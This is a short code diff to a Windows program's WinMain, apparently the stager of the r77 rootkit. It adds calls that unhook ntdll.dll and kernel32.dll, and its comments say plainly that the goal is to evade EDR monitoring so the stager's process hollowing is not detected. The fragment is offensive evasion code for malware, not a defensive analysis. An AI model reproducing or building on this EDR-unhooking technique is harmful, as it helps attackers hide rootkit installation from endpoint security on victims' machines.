@@ -2,6 +2,16 @@
 
 int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
 {
+	// Unhook DLL's that are monitored by EDR.
+	// Otherwise, the call sequence analysis of process hollowing gets detected and the stager is terminated.
+	UnhookDll(L"ntdll.dll");
+	if (IsWindows10OrGreater() || sizeof(LPVOID) == 8)
+	{
+		// Unhooking kernel32.dll on Windows 7 x86 fails.
+		//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
+		UnhookDll(L"kernel32.dll");
+	}
+
 	InitializeApi(INITIALIZE_API_SRAND | INITIALIZE_API_DEBUG_PRIVILEGE);
 
 	// Get r77 DLL.
